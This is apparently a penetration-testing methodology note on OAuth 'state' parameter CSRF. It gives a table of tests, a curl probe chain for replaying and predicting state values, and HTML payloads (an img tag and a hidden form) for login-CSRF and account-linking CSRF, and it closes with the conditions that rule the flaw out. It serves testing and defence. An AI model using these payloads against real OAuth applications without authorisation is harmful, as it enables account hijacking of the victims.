# State parameter — the CSRF binding

`state` exists to bind the authorize request to the callback. When it is not
cryptographically bound to the session, the OAuth flow is a CSRF.

## What `state` is for

The app generates a random `state`, stores it in the session cookie, and sends
the user to the IdP with `state` in the authorize URL. The IdP echoes `state`
back in the callback. The app verifies `state == session.state` before
exchanging the code.

When `state` is not bound:

- A flow started by the attacker can be completed by the victim — the
  victim's session lands on the attacker's account (the login-CSRF shape).
- A flow started by the victim can be completed by the attacker — the
  attacker's OAuth identity is linked to the victim's local account (the
  linking-CSRF shape).

## The test shapes

| Test | What it proves |
|---|---|
| replay a callback with a `state` the app never issued | accepted → `state` is not validated at all |
| replay a callback with a `state` from a *different* session | accepted → `state` is not bound to the session |
| replay the same `state` twice | accepted both times → `state` is not single-use |
| predict the next `state` | sequential or timestamp-derived → predictable |
| reflect `state` into the page | the callback page renders it → a DOM sink |

## The probe chain

```bash
# 1. start a flow, capture the state
curl -i -b "$JAR" -c "$JAR" "$BASE/login" | grep -oP 'state=\K[^&\s]+' > state1.txt

# 2. start a second flow in a fresh jar — a different session
curl -i -b "$JAR2" -c "$JAR2" "$BASE/login" | grep -oP 'state=\K[^&\s]+' > state2.txt

# 3. replay session 1's state against session 2's callback
curl -i -b "$JAR2" "$BASE/callback?code=AAA&state=$(cat state1.txt)"
# if it 302s to the app (session established) rather than 400, state is not bound

# 4. predict — check whether state is sequential or derived
diff state1.txt state2.txt
# if the difference is a fixed offset or a timestamp, state is predictable
```

## The login-CSRF exploit

```html
<!-- attacker's page, visited by the victim -->
<img src="https://idp/authorize?client_id=APP&redirect_uri=https://app/callback&response_type=code&state=ATTACKER_STATE">
```

The victim's browser visits the authorize URL with their active IdP session.
The IdP redirects to `https://app/callback?code=CODE&state=ATTACKER_STATE`.
The app validates `state` against the victim's session — but `ATTACKER_STATE`
was never stored there. If `state` is not validated at all, the victim's
session is established with the attacker's OAuth identity.

## The linking-CSRF exploit

The victim starts an OAuth flow as themselves. The attacker substitutes their
own `authorize` URL (carrying the attacker's `state` and the attacker's IdP
session). The victim's local account is linked to the attacker's OAuth
identity.

```html
<!-- attacker substitutes their authorize URL into the victim's flow -->
<form action="https://idp/authorize" method="GET">
  <input type="hidden" name="client_id" value="APP">
  <input type="hidden" name="redirect_uri" value="https://app/callback">
  <input type="hidden" name="response_type" value="code">
  <input type="hidden" name="state" value="ATTACKER_STATE">
  <input type="submit">
</form>
```

## Falsifier

`state` is a cryptographically random value stored in the session cookie
before the redirect, the callback rejects any state that does not match the
session's stored value, and the stored value is cleared after use (single-use).
When this holds, the CSRF shape closes — move to redirect_uri or token
binding.
